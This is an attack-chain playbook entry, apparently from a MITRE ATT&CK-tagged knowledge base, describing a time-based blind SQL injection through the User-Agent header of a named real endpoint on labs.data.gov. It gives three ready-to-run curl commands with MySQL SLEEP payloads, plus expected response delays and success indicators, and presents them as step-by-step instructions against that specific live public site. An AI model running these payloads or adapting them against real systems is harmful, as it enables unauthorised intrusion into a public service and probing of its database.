---
tags:
  - sqli
  - blind-sqli
  - time-based
  - mysql
  - web
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Confirm-SQLi-with-25-Second-Delay]]'
  - '[[procedures/Confirm-SQLi-with-No-Delay]]'
  - '[[procedures/Confirm-SQLi-with-6-Second-Delay]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:10.351Z'
description: >-
  Multi-stage confirmation of a time-based blind SQL injection vulnerability in
  the /dashboard/datagov/csv_to_json endpoint of labs.data.gov by injecting
  payloads into the User-Agent HTTP header to manipulate MySQL SLEEP functions
  and observe response delays.
skill_level: intermediate
impact_level: high
id: 73d46fcb-d5bc-443c-968a-99d40c14cf18
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Time-Based Blind SQL Injection via User-Agent Header in labs.data.gov

Multi-stage attack chain demonstrating the confirmation of a time-based blind SQL injection vulnerability in the /dashboard/datagov/csv_to_json endpoint of labs.data.gov. The vulnerability allows injection of SQL payloads into the User-Agent HTTP header, which is unsanitized and incorporated into MySQL queries, enabling manipulation of query logic through conditional SLEEP functions to infer data via response timing differences. This chain focuses on verification steps using arithmetic operations to create variable delays, confirming exploitability without direct data extraction.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~40 seconds |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Send Baseline Request] --> B[Inject 25s Delay Payload]
    B --> C[Inject No-Delay Payload]
    C --> D[Inject 6s Delay Payload]
    D --> E[Vulnerability Confirmed]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#f39c12
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[commands/curl-inject-25s-payload]]
- [[commands/curl-inject-no-delay]]
- [[commands/curl-inject-6s-payload]]

### Target Environment

- Web platform with accessible HTTPS endpoint
- MySQL backend database
- No authentication required for the endpoint

### Initial Access Requirements

- Direct network access to labs.data.gov (publicly accessible)
- No credentials needed
- Ability to send custom HTTP headers

## Detailed Attack Procedures

### Step 1: Confirm SQLi with 25-Second Delay
procedure: [[procedures/Confirm-SQLi-with-25-Second-Delay]]

**Objective**: Inject a payload that causes a significant server delay to indicate successful SQL execution and injection point.

**Instructions**: Use [[commands/curl-inject-25s-payload]] to send a GET request with the SQL payload in the User-Agent header:

```bash
curl -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'" -H "Referer: 1" -H "X-Forwarded-For: 1" -H "X-Requested-With: XMLHttpRequest" -H "Accept-Encoding: gzip,deflate" -H "Accept: */*" --connect-timeout 30 https://labs.data.gov/dashboard/datagov/csv_to_json
```

**Expected Output**: Server response delayed by approximately 25 seconds, confirming the SLEEP(25) execution.

**Success Indicators**:
- Response time exceeds 25 seconds
- No immediate error or rejection of the request

### Step 2: Confirm SQLi with No Delay
procedure: [[procedures/Confirm-SQLi-with-No-Delay]]

**Objective**: Send a contrasting payload that results in no delay to validate that delays are due to the injected SQL logic, not network issues.

**Instructions**: Execute [[commands/curl-inject-no-delay]] with a zero-sleep payload:

```bash
curl -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'" -H "Referer: 1" -H "X-Forwarded-For: 1" -H "X-Requested-With: XMLHttpRequest" -H "Accept-Encoding: gzip,deflate" -H "Accept: */*" https://labs.data.gov/dashboard/datagov/csv_to_json
```

**Expected Output**: Immediate server response (under 1 second), contrasting the delay in Step 1.

**Success Indicators**:
- Response time is normal (no delay)
- Consistent with non-malicious requests

### Step 3: Confirm SQLi with 6-Second Delay
procedure: [[procedures/Confirm-SQLi-with-6-Second-Delay]]

**Objective**: Use an arithmetic variation to create a shorter delay, further proving control over SQL execution timing.

**Instructions**: Run [[commands/curl-inject-6s-payload]] incorporating the 6*6-30 calculation:

```bash
curl -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'" -H "Referer: 1" -H "X-Forwarded-For: 1" -H "X-Requested-With: XMLHttpRequest" -H "Accept-Encoding: gzip,deflate" -H "Accept: */*" --connect-timeout 10 https://labs.data.gov/dashboard/datagov/csv_to_json
```

**Expected Output**: Server response delayed by approximately 6 seconds.

**Success Indicators**:
- Response time matches the calculated delay (6 seconds)
- Demonstrates arithmetic evaluation in the injected SQL

## Attack Chain Summary

### Key Achievements

1. Verified injection point in User-Agent header leading to SQL execution
2. Confirmed time-based blind SQLi through variable response delays
3. Highlighted lack of input sanitization in the endpoint's MySQL query handling

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
